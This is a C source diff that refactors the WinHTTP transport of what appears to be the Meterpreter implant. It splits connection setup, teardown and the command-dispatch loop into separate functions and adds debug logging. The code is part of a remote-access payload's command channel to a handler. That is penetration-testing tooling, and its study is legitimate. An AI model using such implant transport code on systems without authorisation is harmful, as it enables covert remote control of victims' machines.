@@ -12,18 +12,14 @@
 #define HOSTNAME_LEN 512
 #define URLPATH_LEN 1024
 
-DWORD server_dispatch_http_winhttp(Remote* remote, THREAD* dispatchThread)
+BOOL server_init_http_winhttp(Remote* remote, SOCKET fd)
 {
-	BOOL running = TRUE;
-	LONG result = ERROR_SUCCESS;
-	Packet * packet = NULL;
-	THREAD * cpt = NULL;
 	URL_COMPONENTS bits;
-	DWORD ecount = 0;
-	DWORD delay = 0;
 	wchar_t tmpHostName[512];
 	wchar_t tmpUrlPath[1024];
 	HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;
+
+	dprintf("[WINHTTP] Initialising ...");
 
 	// Allocate the top-level handle
 	if (!wcscmp(ctx->proxy, L"METERPRETER_PROXY"))
@@ -38,7 +34,7 @@ DWORD server_dispatch_http_winhttp(Remote* remote, THREAD* dispatchThread)
 	if (!ctx->internet)
 	{
 		dprintf("[DISPATCH] Failed WinHttpOpen: %d", GetLastError());
-		return 0;
+		return FALSE;
 	}
 
 	// Proxy auth, if required.
@@ -49,7 +45,7 @@ DWORD server_dispatch_http_winhttp(Remote* remote, THREAD* dispatchThread)
 			dprintf("[DISPATCH] Failed to set proxy username");
 		}
 	}
-	else if(wcscmp(ctx->proxy_pass, L"METERPRETER_PASSWORD_PROXY") != 0)
+	else if (wcscmp(ctx->proxy_pass, L"METERPRETER_PASSWORD_PROXY") != 0)
 	{
 		if (!WinHttpSetOption(ctx->internet, WINHTTP_OPTION_PROXY_PASSWORD, ctx->proxy_pass, lstrlen(ctx->proxy_pass) + 1))
 		{
@@ -72,6 +68,7 @@ DWORD server_dispatch_http_winhttp(Remote* remote, THREAD* dispatchThread)
 	bits.dwUrlPathLength = URLPATH_LEN - 1;
 	bits.lpszUrlPath = tmpUrlPath;
 
+	dprintf("[DISPATCH] About to crack URL: %S", remote->transport->url);
 	WinHttpCrackUrl(remote->transport->url, 0, 0, &bits);
 
 	ctx->uri = _wcsdup(tmpUrlPath);
@@ -84,17 +81,43 @@ DWORD server_dispatch_http_winhttp(Remote* remote, THREAD* dispatchThread)
 	if (!ctx->connection)
 	{
 		dprintf("[DISPATCH] Failed WinHttpConnect: %d", GetLastError());
-		return 0;
+		return FALSE;
 	}
 
 	dprintf("[DISPATCH] Configured hConnection: 0x%.8x", ctx->connection);
 
 	// Bring up the scheduler subsystem.
-	result = scheduler_initialize(remote);
-	if (result != ERROR_SUCCESS)
-	{
-		return result;
-	}
+	return scheduler_initialize(remote) == ERROR_SUCCESS;
+}
+
+DWORD server_deinit_http_winhttp(Remote* remote)
+{
+	HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;
+
+	dprintf("[WINHTTP] Deinitialising ...");
+
+	// Close WinInet handles
+	WinHttpCloseHandle(ctx->connection);
+	WinHttpCloseHandle(ctx->internet);
+
+	dprintf("[DISPATCH] calling scheduler_destroy...");
+	scheduler_destroy();
+
+	dprintf("[DISPATCH] calling command_join_threads...");
+	command_join_threads();
+
+	return TRUE;
+}
+
+DWORD server_dispatch_http_winhttp(Remote* remote, THREAD* dispatchThread)
+{
+	BOOL running = TRUE;
+	LONG result = ERROR_SUCCESS;
+	Packet* packet = NULL;
+	THREAD* cpt = NULL;
+	DWORD ecount = 0;
+	DWORD delay = 0;
+	HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;
 
 	while (running)
 	{
@@ -159,18 +182,6 @@ DWORD server_dispatch_http_winhttp(Remote* remote, THREAD* dispatchThread)
 		running = command_handle(remote, packet);
 		dprintf("[DISPATCH] command_process result: %s", (running ? "continue" : "stop"));
 	}
-
-	// Close WinInet handles
-	WinHttpCloseHandle(ctx->connection);
-	WinHttpCloseHandle(ctx->internet);
-
-	dprintf("[DISPATCH] calling scheduler_destroy...");
-	scheduler_destroy();
-
-	dprintf("[DISPATCH] calling command_join_threads...");
-	command_join_threads();
-
-	dprintf("[DISPATCH] leaving server_dispatch.");
 
 	return result;
 }
